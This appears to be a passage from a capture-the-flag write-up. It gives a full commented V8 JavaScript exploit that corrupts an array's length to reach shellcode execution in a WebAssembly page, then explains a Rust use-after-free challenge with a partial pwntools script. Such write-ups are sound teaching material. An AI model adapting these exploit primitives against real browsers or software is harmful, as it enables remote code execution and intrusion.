<h3 id="js-exp"><a href="#js-exp" class="headerlink" title="js exp"></a>js exp</h3><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">/* This challenge is meant to be extremely hard. The way this exploit goes is
 * essentially as follows:
 *
 * Step 1: Read the patch.diff file to figure out the vulnerability
 *
 * Step 2: Use the vulnerability to get a corrupted float array. You can use
 *         this array to overwrite its own length to a very large number
 *
 * Step 3: Once you've done this, exploitation becomes (relatively) easy. There
 *         are loads of blog posts and other V8 exploits that you can use as
 *         a starting point. I'll list some below. The only issue will be that
 *         V8 somewhat recently started shipping with pointer compression, and
 *         most blog posts / exploits will be made for challenges / vulns from
 *         V8 versions without pointer compression.
 *
 * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
 * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/
 * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration
 * https://blog.hexrabbit.io/2020/03/16/chromatic-aberration-writeup/ (use google translate)
 * https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/ (very old)
 *
 * If you still have questions regarding this challenge, feel free to DM me 
 * anywhere. I'll do my best to respond to queries!
 *
 * Discord: Faith#2563
 * Twitter: @farazsth98
 */</span>

<span class="token comment" spellcheck="true">// Helper functions setup to convert between doubles and numbers when needed</span>
<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f64_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> u32_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) == float</span>
    f64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>u32_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>u32_buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Watch for little endianness</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">itof</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) == BigInt</span>
    u32_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    u32_buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>val <span class="token operator">></span><span class="token operator">></span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> f64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">hex</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) == BigInt</span>
    <span class="token keyword">return</span> <span class="token string">"0x"</span> <span class="token operator">+</span> val<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// We set up a web assembly page. This is mapped as an RWX page that we will</span>
<span class="token comment" spellcheck="true">// later write shellcode into.</span>
<span class="token keyword">var</span> wasm_code <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_mod <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasm_code<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> wasm_instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasm_mod<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> f <span class="token operator">=</span> wasm_instance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] WebAssembly RWX page setup!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Next, set up three arrays. These will be allocated one after another because</span>
<span class="token comment" spellcheck="true">// of the deterministic nature of the V8 heap. We corrupt the float array.</span>
<span class="token comment" spellcheck="true">// You can find their offsets relative to each other using GDB.</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// While we do this, we also trigger the vulnerability to get a corrupted</span>
<span class="token comment" spellcheck="true">// float array in `float_arr`</span>
<span class="token keyword">var</span> float_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
float_arr <span class="token operator">=</span> float_arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Trigger the vuln</span>
<span class="token keyword">var</span> addrof_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Used for the addrof primitive later</span>
<span class="token keyword">var</span> arb_read_arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Used for the arbitrary read primitive later</span>

<span class="token comment" spellcheck="true">// We set up an ArrayBuffer and a DataView. We will use these later to write </span>
<span class="token comment" spellcheck="true">// our shellcode into the RWX page.</span>
<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> dataview <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Corrupting float_arr's length to 2048"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// We need to store the current `elements` ptr before we corrupt the length</span>
<span class="token comment" spellcheck="true">// because corrupting the length also requires us to corrupt the `elements` ptr</span>
<span class="token comment" spellcheck="true">// in the process</span>
<span class="token keyword">var</span> float_arr_elem <span class="token operator">=</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>float_arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Corrupt the length and keep the `elements` ptr intact</span>
float_arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>0x1000n <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span> <span class="token operator">+</span> float_arr_elem<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>float_arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Corruption successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[!] Corruption failed. Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">throw</span> error<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// Setup addrof primitive</span>
<span class="token comment" spellcheck="true">// Bottom 32 bits of float_arr[4] corresponds to addrof_arr[0]</span>
<span class="token comment" spellcheck="true">// We simply set addrof_arr[0] to the object whose address we want to leak</span>
<span class="token comment" spellcheck="true">// Then we read from float_arr[4]</span>
<span class="token keyword">function</span> <span class="token function">addrof</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    addrof_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>float_arr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Addrof primitive has been setup"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Setup an arbitrary read primitive for the V8 compressed heap</span>
<span class="token comment" spellcheck="true">// We do this by overwriting the elements pointer of our arb_read_arr to a</span>
<span class="token comment" spellcheck="true">// chosen address - 8 (making sure to keep the length set to 0x1000). We</span>
<span class="token comment" spellcheck="true">// subtract 8 because for any float array, arr[0] == (*elements_ptr + 8).</span>
<span class="token comment" spellcheck="true">// The elements pointer of arb_read_arr is at float_arr[17], offset found</span>
<span class="token comment" spellcheck="true">// through GDB.</span>
<span class="token comment" spellcheck="true">// addr must be a 32-bit value here</span>
<span class="token keyword">function</span> <span class="token function">compressed_arb_read</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    float_arr<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>0x1000n <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span> <span class="token operator">+</span> addr <span class="token operator">-</span> 8n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>arb_read_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Arbitrary read primitive for the compressed heap has been setup"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Setup a function that writes our shellcode to a given address</span>
<span class="token comment" spellcheck="true">// We do this by overwriting the backing store address of the ArrayBuffer we</span>
<span class="token comment" spellcheck="true">// previously allocated to our chosen address. We then use the DataView that we</span>
<span class="token comment" spellcheck="true">// also allocated to write our shellcode to that address space.</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// Using GDB, we find that the backing store address of our ArrayBuffer is</span>
<span class="token comment" spellcheck="true">// misaligned at float_arr[20] and float_arr[21]. The misalignment is as</span>
<span class="token comment" spellcheck="true">// follows:</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// * The upper 32-bits of float_arr[20] correspond to the lower 32 bits of</span>
<span class="token comment" spellcheck="true">//   the backing store address</span>
<span class="token comment" spellcheck="true">// * The lower 32-bits of float_arr[21] correspond to the upper 32 bits of</span>
<span class="token comment" spellcheck="true">//   the backing store address</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// If this is confusing to you, that's because it is very confusing :p I would</span>
<span class="token comment" spellcheck="true">// suggest looking at this in GDB and comparing whatever I mentioned above to</span>
<span class="token comment" spellcheck="true">// what you see in GDB until it makes sense</span>
<span class="token comment" spellcheck="true">//</span>
<span class="token comment" spellcheck="true">// addr must be a 64-bit value here</span>
<span class="token keyword">function</span> <span class="token function">copy_shellcode</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// The backing store address of buf is not aligned to 64 bytes, so we have</span>
    <span class="token comment" spellcheck="true">// to write the upper 32-bits and the lower 32-bits of our address to two</span>
    <span class="token comment" spellcheck="true">// separate indices like this</span>
    float_arr<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    float_arr<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">itof</span><span class="token punctuation">(</span><span class="token punctuation">(</span>addr <span class="token operator">&amp;</span> 0xffffffff00000000n<span class="token punctuation">)</span> <span class="token operator">></span><span class="token operator">></span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> shellcode<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        dataview<span class="token punctuation">.</span><span class="token function">setUint32</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span>i<span class="token punctuation">,</span> shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// msfvenom -p linux/x64/exec CMD='./flagprinter' --format dword</span>
<span class="token keyword">var</span> shellcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x99583b6a</span><span class="token punctuation">,</span> <span class="token number">0x622fbb48</span><span class="token punctuation">,</span> <span class="token number">0x732f6e69</span><span class="token punctuation">,</span> <span class="token number">0x48530068</span><span class="token punctuation">,</span> <span class="token number">0x2d68e789</span><span class="token punctuation">,</span> <span class="token number">0x48000063</span><span class="token punctuation">,</span> <span class="token number">0xe852e689</span><span class="token punctuation">,</span> <span class="token number">0x0000000e</span><span class="token punctuation">,</span> 
<span class="token number">0x6c662f2e</span><span class="token punctuation">,</span> <span class="token number">0x72706761</span><span class="token punctuation">,</span> <span class="token number">0x65746e69</span><span class="token punctuation">,</span> <span class="token number">0x57560072</span><span class="token punctuation">,</span> <span class="token number">0x0fe68948</span><span class="token punctuation">,</span> <span class="token number">0x00000005</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Now, we leak the address of our RWX page</span>
<span class="token comment" spellcheck="true">// Using GDB, we know this address is at *(&amp;wasm_instance + 0x68)</span>
<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">compressed_arb_read</span><span class="token punctuation">(</span><span class="token function">addrof</span><span class="token punctuation">(</span>wasm_instance<span class="token punctuation">)</span> <span class="token operator">+</span> 0x68n<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] RWX page address found: "</span> <span class="token operator">+</span> <span class="token function">hex</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// Finally, we copy our shellcode to the RWX page and call the WASM function to</span>
<span class="token comment" spellcheck="true">// execute it.</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Copying ./flagprinter shellcode to RWX page"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">copy_shellcode</span><span class="token punctuation">(</span>rwx_page_addr<span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"[+] Printing flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h2 id="6-Zombie"><a href="#6-Zombie" class="headerlink" title="6 [Zombie]"></a>6 [Zombie]</h2><p>This is a medium heap exploit which involves exploiting a soundness hole in the rust type system. Everything is already set up for you, so you don’t have to think too hard about the actual soundness hole though.</p>
<p>The idea here is that you first create a dangling reference to a freed block of memory on the heap. This is done through the <code>infect</code> command, which calls the <code>zombie</code> function with a user provided parameter.</p>
<pre class=" language-rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function">zombie</span><span class="token punctuation">(</span>size<span class="token punctuation">:</span> usize<span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token operator">&amp;</span>'<span class="token keyword">static</span> <span class="token keyword">mut</span> <span class="token punctuation">[</span>u8<span class="token punctuation">]</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> object <span class="token operator">=</span> <span class="token function">vec!</span><span class="token punctuation">[</span><span class="token string">b'A'</span><span class="token punctuation">;</span> size<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> r <span class="token operator">=</span> <span class="token function">virus</span><span class="token punctuation">(</span>object<span class="token punctuation">.</span><span class="token function">as_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    r
<span class="token punctuation">}</span></code></pre>
<p>This zombie function first creates a heap allocated array filled with 0x41 of a user defined size, then calls the <code>virus</code> function.</p>
<p>This is a modification of rustlang issue 25860 as hinted in the code comments.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rust-lang/rust/issues/25860">https://github.com/rust-lang/rust/issues/25860</a></p>
<p>This is a long standing hole in rust’s (normally memory safe) type system which allows one to convert a reference lifetime to the static lifetime and therefore bypass rust’s borrow checker: convert <code>&amp;&#39;a T</code> to <code>&amp;&#39;static T</code> and a big no-no for memory safety.</p>
<p>I have modified this to work with a mutable pointer so now there is a dangling reference which can be used to both read from, and write to the freed block of memory.</p>
<p>Usually this could be done easily using rust’s <code>unsafe</code> keyword, but I decided to make this challenge extra baffling in exchange for source code access.</p>
<h3 id="The-Challenge"><a href="#The-Challenge" class="headerlink" title="The Challenge"></a>The Challenge</h3><p>The idea behind this challenge is that we have a shell with various commands, one of which is the “get flag” command, however that command is hardcoded to be ignored and a new command read in.</p>
<pre class=" language-rust"><code class="language-rust"><span class="token keyword">match</span> line<span class="token punctuation">.</span><span class="token function">as_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token string">"get flag"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">continue</span><span class="token punctuation">,</span>
    <span class="token string">"infect"</span> <span class="token operator">=</span><span class="token operator">></span> infected <span class="token operator">=</span> <span class="token function">Some</span><span class="token punctuation">(</span><span class="token function">infect</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> lines<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string">"eat brains"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">eat_brains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> lines<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> infected<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string">"inspect brains"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">inspect_brains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> lines<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> infected<span class="token punctuation">)</span><span class="token punctuation">,</span>
    _ <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span></code></pre>
<p>after the command is finished executing there is another check to see if the command was “get flag”, and if it was the flag is printed out.</p>
<pre class=" language-rust"><code class="language-rust"><span class="token keyword">if</span> line<span class="token punctuation">.</span><span class="token function">as_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"get flag"</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token function">read_to_string</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Here's the flag: {}"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>So we need to change the command while it is still inside the buffer during the execution of one of our commands.</p>
<p>We also have other commands, “eat brains” and “inspect brains” which allow us to read from and write to our dangling reference returned from the <code>infect</code> function.</p>
<p>The final piece of the puzzle is understanding how the <code>String</code> struct works in rust. It contains a pointer to the heap, and will reallocate to grow when all the heap space for its buffer is used up. In this case we are reading stdin line by line, so if a line is longer than any have previously been, it is possible to force the String struct in the line variable to reallocate to a buffer that we have previously freed.</p>
<h3 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h3><p>First our normal setup:</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span></code></pre>
<p>Now our first step is to create our dangling pointer:</p>
<pre class=" language-python"><code class="language-python">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"infect"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"32"</span><span class="token punctuation">)</span></code></pre>
<p>This will create a pointer to a 32 byte piece of freed memory and then store that in the <code>infected</code> variable in main.</p>
<pre class=" language-python"><code class="language-python">p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"eat brains                     "</span><span class="token punctuation">)</span></code></pre>
<p>Since the <code>.trim()</code> is called on each line before it is compared against the instructions, the trailing whitespace in this command will be ignored and the command recognised as “eat brains”.</p>
<p>The purpose of the trailing whitespace here is to force the line containing this command to allocate a 32 byte buffer to store the command. This will take the buffer we have previously freed and have a dangling reference to back out of the freed bins and use it as part of the string buffer.</p>
<p>Now we have also entered the “eat brains” function at the same time, so we are able to modify the buffer that now contains the “eat brains                     “ string.</p>
<p>The final piece of this puzzle is understanding how strings work in rust. Unlike in C, rust strings are not null terminated, instead the length of the string is stored alongside the pointer to the string and therefore in this case we do not have control over the length of the string.</p>
<p>If we simply replaced the first few bytes of the command buffer with the command we wanted and a null terminator we would end up with:<br>“get flag\x00s                     “</p>
<p>When this is <code>.trim()</code>ed the result would be “get flag\x00s” which would not match the required string “get flag”. Instead we overwrite a few more bytes of the command with the space character:</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">brains</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    counter <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token punctuation">)</span>
